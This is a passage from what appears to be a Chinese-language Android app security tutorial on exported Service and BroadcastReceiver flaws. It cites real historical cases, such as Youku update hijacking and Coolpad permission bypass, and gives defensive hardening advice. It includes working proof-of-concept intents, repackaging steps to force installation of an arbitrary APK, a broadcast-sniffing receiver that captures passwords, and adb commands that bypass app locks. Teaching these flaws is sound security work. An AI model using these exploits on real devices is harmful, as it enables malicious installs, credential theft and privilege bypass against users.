<p><strong>漏洞描述</strong></p>
<p>优酷Android 4.5客户端组件暴露导致第三方应用可以触发其升级过程，同时可以指定升级下载的URL地址，可导致任意应用安装！</p>
<p>暴露组件：<code>com.youku.service.push.StartActivityService</code></p>
<p>该组件对应的部分代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onHandleIntent</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        Intent v0;</span><br><span class="line">        String v23;</span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">pushMsg</span> <span class="operator">=</span> intent.getSerializableExtra(<span class="string">&quot;PushMsg&quot;</span>);</span><br><span class="line">        ......</span><br><span class="line">        AppVersionManager.getInstance(Youku.context).showAppAgreementDialog();</span><br><span class="line">        <span class="keyword">switch</span>(pushMsg.type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                <span class="keyword">goto</span> label_53;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    label_53:</span><br><span class="line">        intent.setFlags(<span class="number">876609536</span>);</span><br><span class="line">        intent.setClass(<span class="built_in">this</span>, UpdateActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateurl&quot;</span>, pushMsg.updateurl);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateversion&quot;</span>, pushMsg.updateversion);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updatecontent&quot;</span>, pushMsg.updatecontent);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateType&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">this</span>.startActivity(intent);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>我们可以发现从Intent从获取名为PushMsg的Serializable的数据，并根据其成员type来执行不同的流程，当type值为1时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址。</p>
<p><strong>漏洞攻击</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用下面代码 修改pushMsg内容，并重打包进目标应用中 进而实现伪造</span></span><br><span class="line"><span class="type">PushMsg</span> <span class="variable">pushMsg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PushMsg</span>();</span><br><span class="line">pushMsg.type = <span class="number">1</span>;</span><br><span class="line">pushMsg.updateurl = <span class="string">&quot;http://gdown.baidu.com/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;</span>;</span><br><span class="line">pushMsg.updatecontent = <span class="string">&quot;This is Fake&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.youku.phone&quot;</span>,<span class="string">&quot;com.youku.service.push.StartActivityService&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;PushMsg&quot;</span>, pushMsg);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>
<p>其中PushMsg类不需要完整实现，只需要编译通过即可；<br>
2.反编译优酷客户端的App得到smali代码，从中提取出PushMsg.smali；<br>
3.反编译上述创建的APK文件，将原PushMsg类的smali文件替换为优酷中的PushMsg.smali文件，重新打包签名；<br>
4.安装并运行重打包后的APK，会看到优酷的升级页面触发，如果设计的好的话，是可以诱导用户安装攻击者指定的APK文件的。</p>
<h4 id="拒接服务攻击"><strong>拒接服务攻击</strong></h4>
<p><strong>原理介绍</strong></p>
<p>Service的拒绝服务主要源于Service启动时对接收的Intent等没有做异常处理情况下，导致崩溃，主要体现在给Service传输的intent或者传输序列化对象导致接收时候的类型传化异常。</p>
<p><strong>漏洞复现</strong></p>
<p><a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048028"><strong>雪球最新Android客户端存在空指针异常及信息泄露漏洞</strong></a></p>
<p>adb shell 下执行下面命令，虚拟机将崩溃。愿意在于空指针调用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_N58T5GMF5RW6URH.png" alt="image-20210908160946499"></p>
<h4 id="Service的安全防护">Service的安全防护</h4>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">安全防护：</span><br><span class="line">    （<span class="number">1</span>）私有service不定义<span class="built_in">int</span>ent-filter并且设置exported为<span class="literal">false</span></span><br><span class="line">    （<span class="number">2</span>）公开的service设置exported为<span class="literal">true</span>，<span class="built_in">int</span>ent-filter可以定义或者不定义</span><br><span class="line">    （<span class="number">3</span>）合作service需对合作方的app签名做校验</span><br><span class="line">    （<span class="number">4</span>）只被应用本身使用的service应设置为私有</span><br><span class="line">    （<span class="number">5</span>）service接收的数据需要谨慎处理</span><br><span class="line">    （<span class="number">6</span>）内部service需要使用签名级别的protectionLevel来判断是否为内部应用调用</span><br><span class="line">    （<span class="number">7</span>）不应在service创建（onCreate方法被调用）的时候决定是否提供服务，应在onStartCommand/onBind/onHandleIntent等方法被调用时做判断</span><br><span class="line">    （<span class="number">8</span>）当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险</span><br><span class="line">    （<span class="number">9</span>）有明确的服务需调用时使用显示意图</span><br><span class="line">    （<span class="number">10</span>）尽量不发送敏感信息</span><br><span class="line">    （<span class="number">11</span>）启动Activity时不设置<span class="built_in">int</span>ent的FLAG_ACTIVITY_NEW_TASK标签</span><br></pre></td></tr></table></figure>
<h2 id="BroadcastReceiver相关漏洞">BroadcastReceiver相关漏洞</h2>
<h3 id="自定义广播接收者BroadcastReceiver">自定义广播接收者BroadcastReceiver</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 继承BroadcastReceivre类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">mBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 复写onReceive()方法</span></span><br><span class="line">  <span class="comment">// 接收到广播后，则自动调用该方法</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">   <span class="comment">//写入接收广播后的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">操作步骤：</span><br><span class="line">（<span class="number">1</span>）继承BroadcastReceivre基类</span><br><span class="line">（<span class="number">2</span>）必须复写抽象方法onReceive()方法</span><br><span class="line">    广播接收器接收到相应广播后，会自动回调 onReceive() 方法，一般情况下，onReceive方法会涉及 与 其他组件之间的交互，如发送Notification、启动Service等，默认情况下，广播接收器运行在 UI 线程，因此，onReceive()方法不能执行耗时操作，否则将导致ANR</span><br></pre></td></tr></table></figure>
<h3 id="广播接收者注册"><strong>广播接收者注册</strong></h3>
<p>注册的两种方式：静态注册，动态注册</p>
<p><strong>静态注册</strong></p>
<p>在AndroidManifest.xml里通过<receive>标签声明</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    //<span class="attr">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //用于接收网络状态改变时发出的广播</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>动态注册</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">I <span class="type">ntentFilter</span> <span class="variable">intentFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">intentFilter</span>();</span><br><span class="line">intentFilter.addAction(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">registerReceiver(<span class="string">&quot;networkChangeReceiver&quot;</span>,intentFilter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPause</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.onPause;</span><br><span class="line">    unregisterReceive(networkChangeReceiver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">networkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">        Toast.makeText(context,<span class="string">&quot;network changes&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）实例化自定义的广播接收者，我们实现广播的功能，可以继承BroadcastReceiver类，并重写类中的方法</span><br><span class="line">（<span class="number">2</span>）实例化意图过滤器，并设置要过滤的广播类型</span><br><span class="line">（<span class="number">3</span>）使用Context的<span class="built_in">registerReceiver</span>(BroadcastReceiver,IntentFilter)方法注册广播</span><br><span class="line">（<span class="number">4</span>）在<span class="built_in">onDestory</span>()方法中通过调用<span class="built_in">unregisterReceiver</span>()方法来实现取消注册</span><br></pre></td></tr></table></figure>
<h3 id="广播的类型">广播的类型</h3>
<h4 id="普通广播">普通广播</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="comment">//对应BroadcastReceiver中intentFilter的action</span></span><br><span class="line">intent.setAction(<span class="string">&quot;BROADCAST_ACTION&quot;</span>);</span><br><span class="line"><span class="comment">//发送广播</span></span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>
<p>若被注册了的广播接收者中注册时intentFilter的action与上述匹配，则会接收此广播（即进行回调onReceive()）,如下mBroadcastReceiver则会接收上述广播</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    //<span class="attr">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //用于接收网络状态改变时发出的广播</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;BROADCAST_ACTION&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果发送的广播有对应权限，那么广播接收者也需要对应权限</p>
<h4 id="系统广播："><strong>系统广播：</strong></h4>
<p>Android中内置了多个系统广播：只要涉及到手机的基本操作（如开机、网络状态变化、拍照等），都会发送相应的广播每个广播都有特定的Intent-Filter(包括具体的action)，Android系统广播action如下：</p>
<h4 id="有序广播">有序广播</h4>
<p>发送出去的广播被广播接收者按照先后顺序接收 有序是针对广播接收者而言的。广播接收者接收广播的顺序规则（同时面向静态和动态注册的广播接收者）：</p>
<p>（1）按照Priority属性值从大-小排序<br>
（2）Priority属性相同者，动态注册的广播优先</p>
<p><strong>特点</strong></p>
<p>（1）接收广播按顺序接收<br>
（2）先接收的广播接收者可以对广播进行截断，即后接收的广播接收者不在接收此广播，可以使用abortBroadcast()方法<br>
（3）先接收的广播接收者可以对广播进行修改，那么后接收的广播接收者将接收到被修改后的广播</p>
<p>具体使用：有序广播的使用过程与普通广播非常类似，差异仅在于广播的发送方式</p>
<p><code>sendOrderedBroadcast(intent,null); //参数1：接收的Intent 参数2：与权限相关字符串，一般为null</code></p>
<h4 id="本地广播">本地广播</h4>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">由于Android中的广播可以跨<span class="keyword">App</span>直接通信（exported对于有intent-filter情况下默认值为true）</span><br><span class="line">导致可能会出现的问题：</span><br><span class="line">    （1）其他<span class="keyword">App</span>针对性发出与当前<span class="keyword">App</span> intent-filter相匹配的广播，由此导致当前<span class="keyword">App</span>不断接收广播并处理</span><br><span class="line">    （2）其他<span class="keyword">App</span>注册与当前<span class="keyword">App</span>一致的intent-filter用于接收广播，获取广播的具体星系，会出现安全性和效率性问题</span><br><span class="line">解决方案：</span><br><span class="line">使用<span class="keyword">App</span>应用内广播（<span class="keyword">Local</span> Broadcast）</span><br><span class="line">    (1)<span class="keyword">App</span>应用内广播可理解为一种局部广播，广播的发送者和接收者都同属于一个<span class="keyword">App</span></span><br><span class="line">    (2)相比于全局广播（普通广播），<span class="keyword">App</span>应用内广播优势体现在：安全性高和效率高</span><br></pre></td></tr></table></figure>
<p><strong>实现步骤</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">1</span>：</span><br><span class="line">将全局广播设置为局部广播</span><br><span class="line">（<span class="number">1</span>）注册广播是将exported属性设置为<span class="literal">false</span>，使得非本App内部发出的此广播不被接收</span><br><span class="line">（<span class="number">2</span>）在广播的发送和接收时，增设相应权限permission，用于权限验证</span><br><span class="line">（<span class="number">3</span>）发送广播时指定该广播接收器所在的包名，此广播将只会发送到此包中的App内与之相匹配的有效广播接收器中</span><br><span class="line">通过<span class="built_in">int</span>ent.setPackage(packageName)指定包名</span><br><span class="line"> </span><br><span class="line">方法<span class="number">2</span>：</span><br><span class="line">    使用封装好的LocalBroadcastManager类使用方式上与全局广播几乎相同，只是注册/取消注册广播接收器和发送广播时将参数context变成LocalBroadcastManager的单一实例。</span><br><span class="line">注意：对于LocalBroadcastManager方式发送的应用内广播，只能通过LocalBroadcastManager动态注册，不能静态注册</span><br></pre></td></tr></table></figure>
<p>方法二的具体实现：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册应用内广播接收器</span></span><br><span class="line"><span class="comment">//步骤1：实例化BroadcastReceiver子类 &amp; IntentFilter mBroadcastReceiver</span></span><br><span class="line">mBroadcastReceiver = new mBroadcastReceiver();</span><br><span class="line">IntentFilter <span class="built_in">int</span>entFilter = new IntentFilter();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//步骤2：实例化LocalBroadcastManager的实例</span></span><br><span class="line">localBroadcastManager = LocalBroadcastManager.getInstance(<span class="keyword">this</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//步骤3：设置接收广播的类型</span></span><br><span class="line"><span class="built_in">int</span>entFilter.addAction(android.net.conn.CONNECTIVITY_CHANGE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//步骤4：调用LocalBroadcastManager单一实例的registerReceiver（）方法进行动态注册</span></span><br><span class="line">localBroadcastManager.registerReceiver(mBroadcastReceiver, <span class="built_in">int</span>entFilter);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//取消注册应用内广播接收器</span></span><br><span class="line">localBroadcastManager.unregisterReceiver(mBroadcastReceiver);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//发送应用内广播</span></span><br><span class="line">Intent <span class="built_in">int</span>ent = new Intent();</span><br><span class="line"><span class="built_in">int</span>ent.setAction(BROADCAST_ACTION);</span><br><span class="line">localBroadcastManager.sendBroadcast(<span class="built_in">int</span>ent);</span><br></pre></td></tr></table></figure>
<h3 id="BroadcastReceiver漏洞原理分析">BroadcastReceiver漏洞原理分析</h3>
<p><strong>漏洞种类</strong></p>
<ul>
<li>敏感信息泄露</li>
<li>权限绕过</li>
<li>消息伪造</li>
<li>拒绝服务</li>
</ul>
<h4 id="敏感信息泄露">敏感信息泄露</h4>
<p><strong>原理介绍</strong>：</p>
<p>发送的intent没有明确指定接受者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。</p>
<p><strong>漏洞复现</strong></p>
<p>案例1</p>
<p>目标程序段代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">d</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    v1.setAction(<span class="string">&quot;com.sample.action.server_running&quot;</span>);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;local_ip&quot;</span>,v0.h);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;port&quot;</span>,v0.i);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;code&quot;</span>,v0.g);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;connected&quot;</span>,v0.s);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;pwd_predefined&quot;</span>,v0.r);</span><br><span class="line">    <span class="keyword">if</span>(!TextUtils.isEmpty(v0.t))&#123;</span><br><span class="line">        v1.putExtra(<span class="string">&quot;connected_usr&quot;</span>,v0.t);</span><br><span class="line">    &#125;</span><br><span class="line">    sendBroadcast(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过intent隐式传递数据，所以编写一个接受者代码，响应action然后获取敏感数据</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;com.sample.action.server_running&quot;</span>))&#123;</span><br><span class="line">        String pwd=intent.getStringExtra(<span class="string">&quot;connected&quot;</span>);</span><br><span class="line">        s=<span class="string">&quot;Airdroid =&gt; [&quot;</span>+pwd+<span class="string">&quot;]/&quot;</span>+intent.getExtras();</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeTest(context,String.format(<span class="string">&quot;%sReceived&quot;</span>,s),Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>案例二：<a target="_blank" rel="noopener" href="https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/">Android 操作系统中通过 RSSI 广播暴露敏感数据 （CVE-2018-9581)</a></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Android操作系统会定期在系统范围内广播WiFI强度值（RSSI）,RSSI值表示设备接收到的信号</span><br><span class="line">的相对强度（更高=更强），但与实际物理强度dBm没有直接关系，这是通过两个独立的intents实现的，Android <span class="number">9</span>之前是android.net.wifi.STATE_CHANGE，其他安卓设备是android.net.wifi.RSSI_CHANGED</span><br><span class="line">    当应用通过WifiManager访问信息时，正常就在应用manifest中请求ACCESS_WIFI_STATE权限。因为<span class="built_in">WiFi</span> RTT特征是Android <span class="number">9</span>中新引入的，也是用于位置定位的，需要ACCESS_FINE_LOCATION权限。但监听系统广播时，</span><br><span class="line">在不需要通知用户，不需要其他权限的情况下就可以获取信息</span><br><span class="line">    存在的安全问题：</span><br><span class="line">    （<span class="number">1</span>）RSSI值是通过广播获取的，绕过的正常的权限检查（ACCESS_WIFI_STATE）</span><br><span class="line">    （<span class="number">2</span>）通过广播或WiFimanager获取的RSSI值可以在不需要其他位置权限的情况下进行室内定制</span><br></pre></td></tr></table></figure>
<p>攻击代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle state)</span> &#123;</span><br><span class="line">    <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();       </span><br><span class="line">    filter.addAction(android.net.wifi.STATE_CHANGE);</span><br><span class="line">    filter.addAction(android.net.wifi.RSSI_CHANGED);</span><br><span class="line">    registerReceiver(receiver, filter);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">BroadcastReceiver</span> <span class="variable">receiver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastReceiver</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    Log.d(intent.toString());</span><br><span class="line">    ….</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="权限绕过">权限绕过</h4>
<p><strong>原理介绍</strong></p>
<p>动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等</p>
<p>案例：<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-09175.html">小米MIUI漏洞可能导致硬件资源消耗</a></p>
<p><strong>漏洞详情</strong></p>
<p>MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒，利用这个漏洞，可以导致系统电源迅速消耗</p>
<p>攻击代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;</span>);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>
<p>案例：<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084520.html">酷派最安全手机s6拨打电话权限绕过</a></p>
<p>漏洞详情：</p>
<p>酷派最安全手机s6拨打电话权限绕过，第三方app可以无需拨打电话权限直接拨打电话</p>
<p><strong>攻击代码</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;com.android.phone&quot;</span>,<span class="string">&quot;com.android.phone.PhoneGlobals$NotificationBroadcastReceiver&quot;</span>));</span><br><span class="line">intent.setAction(<span class="string">&quot;com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION&quot;</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">&quot;tel:10000&quot;</span>));</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>
<p>案例：<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084516.html">酷派最安全手机s6程序锁绕过</a></p>
<p>漏洞详情：</p>
<p>程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的</p>
<p><strong>漏洞测试</strong></p>
<p>用adb shell 发送广播，用来解锁</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -<span class="selector-tag">a</span> android<span class="selector-class">.intent</span><span class="selector-class">.action</span><span class="selector-class">.PACKAGE_FULLY_REMOVED</span> -d package:com<span class="selector-class">.wumii</span><span class="selector-class">.android</span>.mimi</span><br></pre></td></tr></table></figure>
<h4 id="消息伪造-2">消息伪造</h4>
